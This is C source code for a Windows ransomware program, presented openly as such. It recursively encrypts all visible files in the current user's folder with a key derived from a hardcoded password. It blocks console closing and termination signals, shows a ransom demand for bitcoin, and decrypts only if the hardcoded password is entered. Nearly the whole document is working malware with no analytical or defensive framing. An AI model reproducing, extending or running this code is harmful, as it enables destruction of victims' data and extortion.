// ransomware.c - FASTER + UNCLOSABLE (visible files only, anti-kill password screen)
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

HCRYPTPROV hProv = 0;
HCRYPTKEY hKey = 0;
HCRYPTHASH hHash = 0;

// Block ALL termination (Ctrl+C, close button, Task Manager)
BOOL WINAPI ConsoleHandler(DWORD signal) {
    return TRUE;  // Eat EVERY signal
}

// Make console UNCLOSABLE
void make_unclosable() {
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    
    // Disable close button on console
    HWND hConsole = GetConsoleWindow();
    LONG style = GetWindowLong(hConsole, GWL_STYLE);
    style &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
    SetWindowLong(hConsole, GWL_STYLE, style);
    
    // Remove close from system menu
    HMENU hMenu = GetSystemMenu(hConsole, FALSE);
    DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
    DrawMenuBar(hConsole);
}

// Initialize CryptoAPI
BOOL init_crypto(const char* password) {
    if (!CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return FALSE;
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) return FALSE;
    if (!CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(password), 0)) return FALSE;
    if (!CryptDeriveKey(hProv, CALG_RC2, hHash, 0, &hKey)) return FALSE;
    CryptDestroyHash(hHash); hHash = 0;
    return TRUE;
}

void cleanup_crypto() {
    if (hKey) { CryptDestroyKey(hKey); hKey = 0; }
    if (hHash) { CryptDestroyHash(hHash); hHash = 0; }
    if (hProv) { CryptReleaseContext(hProv, 0); hProv = 0; }
}

// Safe path join
int safe_path(char* dest, size_t size, const char* dir, const char* file) {
    return snprintf(dest, size, "%s\\%s", dir, file) < (int)size;
}

// ENCRYPT file (ONLY VISIBLE FILES - no hidden/system)
BOOL encrypt_file(const char* path) {
    DWORD attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;
    
    // SKIP hidden, system, directory files (dir command only)
    if (attr & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY)) 
        return FALSE;
    
    HANDLE hFile = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileLen = GetFileSize(hFile, NULL);
    if (fileLen == INVALID_FILE_SIZE || fileLen == 0) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buf = (BYTE*)malloc(fileLen + 16);
    if (!buf) { CloseHandle(hFile); return FALSE; }
    
    DWORD bytesRead;
    ReadFile(hFile, buf, fileLen, &bytesRead, NULL);
    
    DWORD padLen = 8 - (fileLen % 8);
    if (padLen == 0) padLen = 8;
    for (DWORD i = 0; i < padLen; i++) buf[fileLen + i] = (BYTE)padLen;
    
    DWORD dataLen = fileLen + padLen;
    DWORD bufLen = dataLen + 16;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, buf, &dataLen, bufLen)) {
        free(buf); CloseHandle(hFile); return FALSE;
    }
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buf, dataLen, &bytesWritten, NULL);
    
    free(buf);
    CloseHandle(hFile);
    return TRUE;
}

// DECRYPT file (same visible-only filter)
BOOL decrypt_file(const char* path) {
    DWORD attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;
    if (attr & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY)) 
        return FALSE;
    
    HANDLE hFile = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileLen = GetFileSize(hFile, NULL);
    if (fileLen == INVALID_FILE_SIZE || fileLen < 8) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buf = (BYTE*)malloc(fileLen);
    if (!buf) { CloseHandle(hFile); return FALSE; }
    
    DWORD bytesRead;
    ReadFile(hFile, buf, fileLen, &bytesRead, NULL);
    
    DWORD dataLen = fileLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, buf, &dataLen)) {
        free(buf); CloseHandle(hFile); return FALSE;
    }
    
    BYTE pad = buf[dataLen - 1];
    if (pad <= 8 && pad > 0) dataLen -= pad;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buf, dataLen, &bytesWritten, NULL);
    
    free(buf);
    CloseHandle(hFile);
    return TRUE;
}

// FAST recursive encryption (VISIBLE FILES ONLY)
void encrypt_all_fast(const char* root) {
    char pattern[MAX_PATH];
    if (!safe_path(pattern, sizeof(pattern), root, "*")) return;
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFileA(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_all_fast(fullPath);
        } else {
            encrypt_file(fullPath);  // Automatically skips hidden/system
        }
    } while (FindNextFileA(hFind, &data));
    
    FindClose(hFind);
}

// FAST recursive decryption
void decrypt_all_fast(const char* root) {
    char pattern[MAX_PATH];
    if (!safe_path(pattern, sizeof(pattern), root, "*")) return;
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFileA(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decrypt_all_fast(fullPath);
        } else {
            decrypt_file(fullPath);
        }
    } while (FindNextFileA(hFind, &data));
    
    FindClose(hFind);
}

int main() {
    // Make UNCLOSABLE from start
    make_unclosable();
    
    // Secret password
    const char* secret = "MySecretRansomKey1234567890";
    if (!init_crypto(secret)) return 1;
    
    // Target user folder
    char username[128] = {0};
    char target[MAX_PATH] = {0};
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);
    snprintf(target, sizeof(target), "C:\\Users\\%s", username);
    
    // FAST encryption (visible files only)
    encrypt_all_fast(target);
    
    // Ransom screen
    char ransomMsg[1024];
    snprintf(ransomMsg, sizeof(ransomMsg),
        "ALL VISIBLE FILES IN C:\\Users\\%s ARE ENCRYPTED!\n\n"
        "Pay 5 BTC to 1RansomWallet123\n"
        "OR LOSE EVERYTHING FOREVER!\n\n"
        "Contact: fake@onion.com", username);
    
    MessageBoxA(NULL, ransomMsg, "YOUR FILES ARE LOCKED!", 
                MB_ICONSTOP | MB_SYSTEMMODAL | MB_SETFOREGROUND);
    
    // UNCLOSABLE password input
    printf("\n=== RANSOM PAYMENT TERMINAL ===\n");
    printf("Enter decryption password: ");
    fflush(stdout);
    
    char password[128] = {0};
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = 0;
    
    cleanup_crypto();
    
    if (strcmp(password, secret) == 0) {
        init_crypto(secret);
        decrypt_all_fast(target);
        MessageBoxA(NULL, "Files UNLOCKED - Payment verified", "SUCCESS", MB_OK);
    } else {
        MessageBoxA(NULL, 
            "WRONG PASSWORD!\n"
            "Files PERMANENTLY ENCRYPTED.\n"
            "No recovery possible.", 
            "DATA LOST FOREVER", MB_ICONERROR | MB_SYSTEMMODAL);
    }
    
    cleanup_crypto();
    return 0;
}
